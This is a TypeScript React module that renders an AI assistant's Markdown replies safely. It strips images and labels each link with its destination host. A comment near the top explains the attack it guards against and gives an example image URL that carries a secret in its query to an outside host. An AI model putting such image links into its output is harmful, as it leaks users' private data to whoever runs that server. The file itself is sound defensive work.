import { Fragment, createElement, isValidElement, type ReactNode } from "react";
import type { Components } from "react-markdown";

/*
 * How replies' Markdown is drawn wherever Flash shows or saves it (the chat, the PDF of a reply and
 * the downloaded chat). A reply can carry what Claude read from the user's private data, so nothing
 * in it may load from another server by itself: a Markdown picture (![](https://x/?d=secret)) would
 * send that data to whoever runs x the moment the reply is shown or the saved page is opened. Pictures
 * are left out (Flash's own pictures come as their own events, not in the words), and each link shows
 * the host it goes to, so a click never goes somewhere the words hide.
 */

/** The text inside a piece of React content. */
function textOf(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (isValidElement<{ children?: ReactNode }>(node)) return textOf(node.props.children);
  return "";
}

// Stands for the page a link is on, to read links written without a scheme ("//host/…") as a browser does.
const HERE = "https://flash.invalid/";

/** The host a web link goes to, or "" for anything else (a link inside Flash, an email address). */
export function linkHost(href: string | undefined): string {
  if (!href) return "";
  let url: URL;
  try {
    url = new URL(href);
  } catch {
    try {
      url = new URL(href, HERE);
    } catch {
      return "";
    }
  }
  if (url.host === new URL(HERE).host) return "";
  return url.protocol === "https:" || url.protocol === "http:" ? url.host : "";
}

export const safeMarkdown: Components = {
  img: () => null,
  a({ href, children }) {
    const host = linkHost(href);
    const link = createElement("a", { href, target: "_blank", rel: "noreferrer noopener" }, children);
    // Left out only when the words are that host, or an address on it: words that merely mention it can still hide where a link goes.
    const text = textOf(children).trim().toLowerCase();
    if (!host || text === host || linkHost(text) === host) return link;
    return createElement(Fragment, null, link, createElement("span", { className: "link-host" }, ` (${host})`));
  },
};
